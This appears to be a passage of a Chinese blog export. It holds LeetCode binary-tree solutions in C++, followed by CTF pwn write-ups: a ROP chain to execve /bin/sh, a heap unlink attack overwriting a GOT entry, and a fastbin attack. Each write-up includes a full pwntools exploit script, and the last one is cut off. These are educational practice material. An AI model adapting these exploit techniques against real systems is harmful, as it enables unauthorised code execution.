&amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))<span class="comment">//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans = root;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="法二-存储父节点"><a href="#法二-存储父节点" class="headerlink" title="法二:存储父节点"></a>法二:存储父节点</h4><p>从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。<br>从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。<br>同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>, TreeNode*&gt; fa;</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">bool</span>&gt; vis;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;left-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;right-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        fa[root-&gt;val] = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            vis[p-&gt;val] = <span class="literal">true</span>;</span><br><span class="line">            p = fa[p-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (q != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vis[q-&gt;val]) <span class="keyword">return</span> q;</span><br><span class="line">            q = fa[q-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。</p><p>为了让您更好地理解问题，以下面的二叉搜索树为例：</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdlloriginalbst.png" alt="img"></p><p>我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。</p><p>下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdllreturndll.png" alt="img"></p><p>特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。</p><ul><li>思路：</li></ul><p>二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素：</p><p>排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大”访问树的节点。<br>双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。<br>循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。</p><ul><li>算法流程</li></ul><p>dfs(cur): 递归法中序遍历；</p><p>终止条件： 当节点 cur 为空，代表越过叶节点，直接返回；<br>递归左子树，即 dfs(cur.left) ；<br>构建链表：<br>当 pre 为空时： 代表正在访问链表头节点，记为 head ；<br>当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， cur.left = pre ；<br>保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ；<br>递归右子树，即 dfs(cur.right) ；<br>treeToDoublyList(root)：</p><p>特例处理： 若节点 root 为空，则直接返回；<br>初始化： 空节点 pre ；<br>转化为双向链表： 调用 dfs(root) ；<br>构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可；<br>返回值： 返回链表的头节点 head 即可；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">treeToDoublyList</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        head-&gt;left = pre;</span><br><span class="line">        pre-&gt;right = head;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node *pre, *head;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(Node* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">nullptr</span>) pre-&gt;right = cur; <span class="comment">//用pre来查找</span></span><br><span class="line">        <span class="keyword">else</span> head = cur; <span class="comment">//找到头结点</span></span><br><span class="line">        cur-&gt;left = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析：<br>时间复杂度 O(N)： N 为二叉树的节点数，中序遍历需要访问所有节点。<br>空间复杂度 O(N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O(N)栈空间。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmcc_simplerop</title>
      <link href="/2022/01/24/cmcc_simplerop/"/>
      <url>/2022/01/24/cmcc_simplerop/</url>
      
        <content type="html"><![CDATA[<p>系统调用+rop</p><span id="more"></span><h1 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>32位程序，开了NX，部分RELRO保护</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148415.png" alt="image-20220124214841349"></p><p>主函数存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148568.png" alt="image-20220124214824363"></p><p>该题 没有system函数和’/bin/sh’，考虑使用int 80系统调用，地址为0x080493e1</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242159336.png" alt="image-20220124215933258"></p><p>设置系统调用int80(11,”/bin/sh”,null,null”)的参数eax,ebx,ecx,edx</p><p>找到eax，进行赋值,地址为0x080bae06</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242247809.png" alt="image-20220124224731633"></p><p>找到pop edx;pop,ecx;ret，地址为0x0806e850</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242218036.png" alt="image-20220124221830924"></p><p>接下来调用read函数，将/bin/sh写入bss段，没有开PIE，bss地址为绝对地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242300841.png" alt="image-20220124230033674"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 29088)</span></span><br><span class="line">p = process(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806cd50</span></span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_eax_ret = <span class="number">0x0806e850</span></span><br><span class="line">bss_addr = <span class="number">0x080eb584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p32(read_addr)       <span class="comment"># 返回到read函数</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret)<span class="comment"># 平衡栈空间</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)<span class="comment"># read函数的三个参数 </span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)<span class="comment"># 对eax进行赋值为11</span></span><br><span class="line"><span class="comment"># 对edx、ecx、ebx进行赋值</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_unlink</title>
      <link href="/2022/01/19/hitcontraining_unlink/"/>
      <url>/2022/01/19/hitcontraining_unlink/</url>
      
        <content type="html"><![CDATA[<p>ulink</p><span id="more"></span><h1 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>检查：64位程序，开了NX和canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191955197.png" alt="image-20220119195523133"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192002172.png" alt="image-20220119200216108"></p><p>存在magic函数（实际上并没什么用）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192004969.png" alt="image-20220119200403815"></p><p>查看主函数及各菜单功能</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958337.png" alt="image-20220119195845261"></p><p>show()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958451.png" alt="image-20220119195819384"></p><p>add()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959489.png" alt="image-20220119195919396"></p><p>change()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959852.png" alt="image-20220119195949766"></p><p>在change_item()函数中并没有对输入的内容size进行检查，存在堆溢出</p><p>remove()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192000543.png" alt="image-20220119200014470"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/112602827">unlink基本知识</a></p><p>新版unlink要求</p><blockquote><p>// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)<br>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      <br>      malloc_printerr (“corrupted size vs. prev_size”);               \</p><p>// 检查 fd 和 bk 指针(双向链表完整性检查)<br>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      <br>  malloc_printerr (check_action, “corrupted double-linked list”, P, AV);  \</p><p>  // largebin 中 next_size 双向链表完整性检查<br>              if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              <br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    <br>              malloc_printerr (check_action,                                      <br>                               “corrupted double-linked list (not small)”,    <br>                               P, AV);</p></blockquote><p>利用思路：</p><ul><li>构造fake_chunk</li><li>通过unlink，把 chunk 移到存储 chunk 指针的内存处</li><li>覆盖 chunk 0 指针为 atoi@got 表地址并泄露</li><li>覆盖 atoi 的 got 表为 system 函数地址。</li><li>给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27663</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,name</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020C8</span>  <span class="comment">#存放chunk指针的数组在bss段上的地址</span></span><br><span class="line"><span class="comment">#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)</span></span><br><span class="line">fake_chunk =  p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)  <span class="comment">#fake_chunk header</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>) <span class="comment">#fake_chunk fd  bk</span></span><br><span class="line">fake_chunk += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>) <span class="comment"># 1的presize </span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment"># 1的size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#前向合并，合并0中的fake_chunk  放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment">#覆盖的itemlist[0]-&gt;ptr 为atoi_got</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">https://blog.csdn.net/mcmuyanga/article/details/113105091</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf2017-babyheap</title>
      <link href="/2022/01/14/0ctf_2017_babyheap/"/>
      <url>/2022/01/14/0ctf_2017_babyheap/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack</p><span id="more"></span><h2 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h2><p>例行检查，64位程序，保护全开</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142234035.png" alt="image-20220114223429901"></p><p>ida查看main函数，菜单题</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142237640.png" alt="image-20220114223706573"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142308074.png" alt="image-20220114230844952"></p><p>sub_D48：对应Allocate申请内存地址用来存放结构体，申请内存用的是calloc</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142305611.png" alt="image-20220114230534549"></p><p>sub_E7F：对应编辑edit，这里没有检查size ，存在堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142329754.png" alt="image-20220114232935653"></p><p>sub_F50:对应delete，free后指针清零不存在UAF</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142336137.png" alt="image-20220114233654889"></p><p>sub_1051就是puts打印</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写</p><h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./0ctf_2017_babyheap&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26060</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span>(<span class="params">size</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span 